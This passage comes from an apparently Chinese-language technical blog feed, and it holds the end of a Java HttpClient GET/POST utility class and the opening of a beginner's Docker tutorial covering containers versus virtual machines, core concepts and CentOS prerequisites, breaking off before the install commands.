class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApiUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CHARSET</span> <span class="operator">=</span> <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Integer</span> <span class="variable">SUCCESS_CODE</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Integer</span> <span class="variable">ERROR_CODE</span> <span class="operator">=</span> <span class="number">400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>:根据method调用API接口返回封装后的dto</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Param</span>: [method, url, params]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Return</span>: java.lang.String</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@date</span>: 6/7/2021</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Time</span>: 3:37 PM</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ApiRequest <span class="title function_">request</span><span class="params">(String method, String url, Map&lt;String, String&gt; params)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;指定请求方式POST/GET&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equalsIgnoreCase(<span class="string">&quot;GET&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> doGet(url, params);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equalsIgnoreCase(<span class="string">&quot;POST&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> doPost(url, params);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;指定请求方式POST/GET&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>:GET请求方式封装</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Param</span>: [url, params]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Return</span>: com.cn.oeServiceCommon.dto.ApiRequest</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span>: Nan-ZN.Xu@com.com</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@date</span>: 6/8/2021</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Time</span>: 10:35 AM</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ApiRequest <span class="title function_">doGet</span><span class="params">(String url, Map&lt;String, String&gt; params)</span> &#123;</span><br><span class="line">        <span class="type">RequestConfig</span> <span class="variable">config</span> <span class="operator">=</span> RequestConfig.custom()</span><br><span class="line">                .setSocketTimeout(<span class="number">5000</span>)<span class="comment">//数据传输过程中数据包之间间隔的最大时间</span></span><br><span class="line">                .setConnectTimeout(<span class="number">5000</span>)<span class="comment">//连接建立时间</span></span><br><span class="line">                .setConnectionRequestTimeout(<span class="number">5000</span>)<span class="comment">//从连接池获取连接的超时时间</span></span><br><span class="line">                .build();</span><br><span class="line">        <span class="comment">//创建httpclient客户端并设置请求配置</span></span><br><span class="line">        <span class="type">CloseableHttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> HttpClientBuilder.create().setDefaultRequestConfig(config).build();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化DTO对象</span></span><br><span class="line">        <span class="type">ApiRequest</span> <span class="variable">apiRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApiRequest</span>();</span><br><span class="line">        apiRequest.setApiUrl(url);</span><br><span class="line">        apiRequest.setReturnCode(ERROR_CODE);</span><br><span class="line">        apiRequest.setCallTimeStamp(<span class="literal">null</span>);</span><br><span class="line">        apiRequest.setRequest(params);</span><br><span class="line">        apiRequest.setResult(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isBlank(url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> apiRequest;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (params != <span class="literal">null</span> &amp;&amp; !params.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                List&lt;NameValuePair&gt; pairs = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(params.size());</span><br><span class="line">                <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">                    <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">                        pairs.add(<span class="keyword">new</span> <span class="title class_">BasicNameValuePair</span>(entry.getKey(), value));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//将参数拼接在url后面同时设置编码格式</span></span><br><span class="line">                url += <span class="string">&quot;?&quot;</span> + EntityUtils.toString(<span class="keyword">new</span> <span class="title class_">UrlEncodedFormEntity</span>(pairs), CHARSET);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建Get请求</span></span><br><span class="line">        <span class="type">HttpGet</span> <span class="variable">httpGet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">        <span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">startTimeStamp</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">            <span class="comment">//由客户端执行(发送)Get请求</span></span><br><span class="line">            response = httpClient.execute(httpGet);</span><br><span class="line">            <span class="type">long</span> <span class="variable">endTimeStamp</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取状态码</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">statusCode</span> <span class="operator">=</span> response.getStatusLine().getStatusCode();</span><br><span class="line">            <span class="keyword">if</span> (statusCode != SUCCESS_CODE) &#123;</span><br><span class="line">                apiRequest.setCallTimeStamp(endTimeStamp - startTimeStamp);</span><br><span class="line">                <span class="comment">//中止Get请求</span></span><br><span class="line">                httpGet.abort();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//从响应模型中获取响应实体</span></span><br><span class="line">            <span class="type">HttpEntity</span> <span class="variable">entity</span> <span class="operator">=</span> response.getEntity();</span><br><span class="line">            <span class="keyword">if</span> (entity != <span class="literal">null</span>) &#123;</span><br><span class="line">                apiRequest.setReturnCode(SUCCESS_CODE);</span><br><span class="line">                <span class="comment">//设置响应时间</span></span><br><span class="line">                apiRequest.setCallTimeStamp(endTimeStamp - startTimeStamp);</span><br><span class="line">                <span class="comment">//获取响应内容</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> EntityUtils.toString(entity, CHARSET);</span><br><span class="line">                <span class="comment">//将JSON文本串转换为对象</span></span><br><span class="line">                <span class="type">JSONObject</span> <span class="variable">resultOj</span> <span class="operator">=</span> JSONObject.parseObject(result);</span><br><span class="line">                apiRequest.setResult(resultOj);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//释放实体资源</span></span><br><span class="line">            EntityUtils.consume(entity);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParseException | IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//释放资源</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (httpClient != <span class="literal">null</span>) &#123;</span><br><span class="line">                    httpClient.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (response != <span class="literal">null</span>) &#123;</span><br><span class="line">                    response.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> apiRequest;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>:POST请求方式封装</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Param</span>: [url, params]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Return</span>: com.cn.oeServiceCommon.dto.ApiRequest</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@date</span>: 6/8/2021</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Time</span>: 10:44 AM</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ApiRequest <span class="title function_">doPost</span><span class="params">(String url, Map&lt;String, String&gt; params)</span> &#123;</span><br><span class="line">        <span class="type">RequestConfig</span> <span class="variable">config</span> <span class="operator">=</span> RequestConfig.custom()</span><br><span class="line">                .setSocketTimeout(<span class="number">5000</span>)<span class="comment">//数据传输过程中数据包之间间隔的最大时间</span></span><br><span class="line">                .setConnectTimeout(<span class="number">5000</span>)<span class="comment">//连接建立时间</span></span><br><span class="line">                .setConnectionRequestTimeout(<span class="number">5000</span>)<span class="comment">//从连接池获取连接的超时时间</span></span><br><span class="line">                .build();</span><br><span class="line">        <span class="comment">//创建httpclient客户端并设置请求配置</span></span><br><span class="line">        <span class="type">CloseableHttpClient</span> <span class="variable">httpClient</span> <span class="operator">=</span> HttpClientBuilder.create().setDefaultRequestConfig(config).build();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化DTO对象</span></span><br><span class="line">        <span class="type">ApiRequest</span> <span class="variable">apiRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApiRequest</span>();</span><br><span class="line">        apiRequest.setApiUrl(url);</span><br><span class="line">        apiRequest.setReturnCode(ERROR_CODE);</span><br><span class="line">        apiRequest.setCallTimeStamp(<span class="literal">null</span>);</span><br><span class="line">        apiRequest.setRequest(params);</span><br><span class="line">        apiRequest.setResult(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isBlank(url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> apiRequest;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建POST请求</span></span><br><span class="line">        <span class="type">HttpPost</span> <span class="variable">httpPost</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpPost</span>(url);</span><br><span class="line">        <span class="keyword">if</span> (params != <span class="literal">null</span> &amp;&amp; !params.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                List&lt;NameValuePair&gt; pairs = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(params.size());</span><br><span class="line">                <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">                    <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">                        pairs.add(<span class="keyword">new</span> <span class="title class_">BasicNameValuePair</span>(entry.getKey(), value));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//设置参数</span></span><br><span class="line">                httpPost.setEntity(<span class="keyword">new</span> <span class="title class_">UrlEncodedFormEntity</span>(pairs, CHARSET));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">startTimeStamp</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">            <span class="comment">//发送请求</span></span><br><span class="line">            response = httpClient.execute(httpPost);</span><br><span class="line">            <span class="type">long</span> <span class="variable">endTimeStamp</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">statusCode</span> <span class="operator">=</span> response.getStatusLine().getStatusCode();</span><br><span class="line">            <span class="keyword">if</span> (statusCode != SUCCESS_CODE) &#123;</span><br><span class="line">                apiRequest.setCallTimeStamp(endTimeStamp - startTimeStamp);</span><br><span class="line">                <span class="comment">//中止请求</span></span><br><span class="line">                httpPost.abort();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//从响应模型中获取响应实体</span></span><br><span class="line">            <span class="type">HttpEntity</span> <span class="variable">entity</span> <span class="operator">=</span> response.getEntity();</span><br><span class="line">            <span class="keyword">if</span> (entity != <span class="literal">null</span>) &#123;</span><br><span class="line">                apiRequest.setReturnCode(SUCCESS_CODE);</span><br><span class="line">                apiRequest.setCallTimeStamp(endTimeStamp - startTimeStamp);</span><br><span class="line">                <span class="comment">//获取响应内容并转换为对象</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> EntityUtils.toString(entity, CHARSET);</span><br><span class="line">                <span class="type">JSONObject</span> <span class="variable">resultOj</span> <span class="operator">=</span> JSONObject.parseObject(result);</span><br><span class="line">                apiRequest.setResult(resultOj);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//释放实体资源</span></span><br><span class="line">            EntityUtils.consume(entity);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParseException | IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//释放资源</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (httpClient != <span class="literal">null</span>) &#123;</span><br><span class="line">                    httpClient.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (response != <span class="literal">null</span>) &#123;</span><br><span class="line">                    response.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> apiRequest;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HttpClient </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker入门篇</title>
      <link href="/posts/6883/"/>
      <url>/posts/6883/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考视频：周阳老师的尚硅谷_Docker核心技术（基础篇）<a href="https://www.bilibili.com/video/BV1Vs411E7AR">https://www.bilibili.com/video/BV1Vs411E7AR</a></p></blockquote><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://www.docker.com/">Docker官网</a></p><p><a href="https://docs.docker.com/">Docker官方文档</a></p><p><a href="https://hub.docker.com/">Docker Hub官网</a></p><p><a href="https://docker_practice.gitee.io/zh-cn/">中文参考手册</a></p><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><p><strong>为什么会有Docker出现？</strong></p><p>一款产品从开发到上线，从操作系统，到运行环境，再到应用配置。作为开发+运维之间的协作我们需要关心很多东西，这也是很多互联网公司都不得不面对的问题，特别是各种版本的迭代之后，不同版本环境的兼容，对运维人员都是考验。</p><p>环境配置如此麻烦，换一台机器，就要重来一次，费力费时。很多人想到，能不能从根本上解决问题，<strong>软件可以带环境安装？</strong>也就是说，安装的时候，把原始环境一模一样地复制过来。<strong>开发人员利用 Docker 可以消除协作编码时“在我的机器上可正常工作”的问题。</strong></p><p>之前在服务器配置一个应用的运行环境，要安装各种软件，Java&#x2F;Tomcat&#x2F;MySQL&#x2F;JDBC驱动包等。安装和配置这些东西有多麻烦就不说了，它还不能跨平台。假如我们是在 Windows 上安装的这些环境，到了 Linux 又得重新装。况且就算不跨操作系统，换另一台同样操作系统的服务器，要移植应用也是非常麻烦的。</p><hr><p><strong>Docker理念：</strong></p><p>Docker是基于<strong>Go语言</strong>实现的云开源项目。</p><p>Docker的主要目标是“Build，Ship and Run Any App，Anywhere”，也就是通过对应用组件的封装、分发、部署、运行等生命周期的管理，使用户的APP（可以是一个WEB应用或数据库应用等等）及其运行环境能够做到<strong>“一次封装，到处运行”</strong>。</p><p>Linux 容器技术的出现就解决了这样一个问题，而 Docker 就是在它的基础上发展过来的。将应用运行在 Docker 容器上面，而 Docker 容器在任何操作系统上都是一致的，这就实现了<strong>跨平台、跨服务器</strong>。只需要一次配置好环境，换到别的机子上就可以一键部署好，大大简化了操作</p><hr><p>一句话：<strong>解决了运行环境和配置软件问题的容器，方便做持续集成并有助于整体发布的容器虚拟化技术。</strong></p><h2 id="能干嘛"><a href="#能干嘛" class="headerlink" title="能干嘛"></a>能干嘛</h2><p>之前的虚拟化技术：<strong>虚拟机</strong>（virtual machine）就是带环境安装的一种解决方案。</p><p>它可以在一种操作系统里面运行另一种操作系统，比如在Windows 系统里面运行Linux 系统。应用程序对此毫无感知，因为虚拟机看上去跟真实系统一模一样，而对于底层系统来说，虚拟机就是一个普通文件，不需要了就删掉，对其他部分毫无影响。这类虚拟机完美的运行了另一套系统，能够使应用程序，操作系统和硬件三者之间的逻辑不变。 </p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210531162229.png"></p><p>虚拟机的缺点：资源占用多、冗余步骤多、启动慢</p><hr><p>容器虚拟化技术：由于虚拟机存在这些缺点，Linux 发展出了另一种虚拟化技术：<strong>Linux 容器</strong>（Linux Containers，缩写为 LXC）。</p><p>Linux 容器<strong>不是模拟一个完整的操作系统</strong>，而是对进程进行隔离。有了容器，就可以将软件运行所需的所有资源打包到一个隔离的容器中。容器与虚拟机不同，不需要捆绑一整套操作系统，只需要软件工作所需的库资源和设置。系统因此而变得高效轻量并保证部署在任何环境中的软件都能始终如一地运行。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210531163236.png"></p><hr><p>比较了 Docker 和传统虚拟化方式的不同之处：</p><ul><li><p>传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；</p></li><li><p>而容器内的应用进程直接运行于宿主的内核，容器内<strong>没有自己的内核，而且也没有进行硬件虚拟</strong>。因此容器要比传统虚拟机更为轻便。</p></li><li><p>每个容器之间互相<strong>隔离</strong>，每个容器有自己的文件系统 ，容器之间进程不会相互影响，能区分计算资源。</p></li></ul><h2 id="DevOps（开发-运维）"><a href="#DevOps（开发-运维）" class="headerlink" title="DevOps（开发&#x2F;运维）"></a>DevOps（开发&#x2F;运维）</h2><ul><li><p>更快速的应用交付和部署</p><p>传统的应用开发完成后，需要提供一堆安装程序和配置说明文档，安装部署后需根据配置文档进行繁杂的配置才能正常运行。Docker化之后只需要交付少量<strong>容器镜像文件</strong>，在正式生产环境加载镜像并运行即可，应用安装配置在镜像里已经内置好，大大节省部署配置和测试验证时间。</p></li><li><p>更便捷的升级和扩缩容</p><p>随着微服务架构和Docker的发展，大量的应用会通过微服务方式架构，应用的开发构建将变成搭乐高积木一样，每个Docker容器将变成一块“积木”，应用的升级将变得非常容易。当现有的容器不足以支撑业务处理时，可通过镜像运行新的容器进行快速扩容，使应用系统的扩容从原先的天级变成分钟级甚至秒级。</p></li><li><p>更简单的系统运维</p><p>应用容器化运行后，生产环境运行的应用可与开发、测试环境的应用高度一致，容器会将应用程序相关的环境和状态完全封装起来，不会因为底层基础架构和操作系统的不一致性给应用带来影响，产生新的BUG。当出现程序异常时，也可以通过测试环境的相同容器进行快速定位和修复。</p></li><li><p>更高效的计算资源利用</p><p>Docker是内核级虚拟化，其不像传统的虚拟化技术一样需要额外的Hyper-visor支持，所以在一台物理机上可以运行很多个容器实例，可大大提升物理服务器的CPU和内存的利用率。</p></li></ul><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="Docker的基本组成"><a href="#Docker的基本组成" class="headerlink" title="Docker的基本组成"></a>Docker的基本组成</h2><ul><li>镜像：Docker 镜像（Image）就是一个<strong>只读</strong>的模板。镜像可以用来创建 Docker 容器，一个镜像可以创建很多容器。<strong>镜像与容器的关系类似于面向对象编程中的类与对象。</strong></li></ul><ul><li><p>容器：Docker 利用容器（Container）独立运行的一个或一组应用。容器是用镜像创建的运行实例。它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台。<strong>可以把容器看做是一个简易版的 Linux 环境</strong>（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。</p></li><li><p>仓库：仓库是集中存放镜像文件的场所。仓库(Repository)和仓库注册服务器（Registry）是有区别的。仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像，每个镜像有不同的标签（tag）。仓库分为公开仓库（Public）和私有仓库（Private）两种形式。最大的公开仓库是 Docker Hub，存放了数量庞大的镜像供用户下载。国内的公开仓库包括阿里云 、网易云等。</p></li><li><p>架构图：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210531175422.png"></p><blockquote><p><strong>总结：</strong></p><p>Docker 本身是一个<strong>容器运行载体或称之为管理引擎</strong>。我们把应用程序和配置依赖打包好形成一个可交付的运行环境，这个打包好的运行环境就似乎 image镜像文件。只有通过这个镜像文件才能生成 Docker 容器。image 文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。</p><ul><li><p>image 文件生成的容器实例，本身也是一个文件，称为镜像文件。</p></li><li><p>一个容器运行一种服务，当我们需要的时候，就可以通过docker客户端创建一个对应的运行实例，也就是我们的容器。</p></li><li><p>至于仓库，就是放了一堆镜像的地方，我们可以把镜像发布到仓库中，需要的时候从仓库中拉下来就可以了。</p></li></ul></blockquote></li></ul><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>Docker支持以下的CentOS版本：</p><ul><li><p>CentOS 7 (64-bit)系统的内核版本为 3.10 以上。</p></li><li><p>CentOS 6.5 (64-bit) 或更高的版本系统的内核版本为 2.6.32-431 或者更高版本。</p></li></ul><p>查看系统内核：uname命令用于打印当前系统相关信息（内核版本号、硬件架构、主机名称和操作系统类型等）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure><p>查看已安装的CentOS版本信息（CentOS6.8有，CentOS7无该命令）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CentOS6.8: cat /etc/redhat-release</span><br><span class="line">CentOS7:  cat /etc/os-release</span><br></pre></td></tr></table></figure><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><p>CentOS7安装Docker参考文档地址：<a href="https://docs.docker.com/engine/install/centos/">https://docs.docker.com/engine/install/centos/</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"> 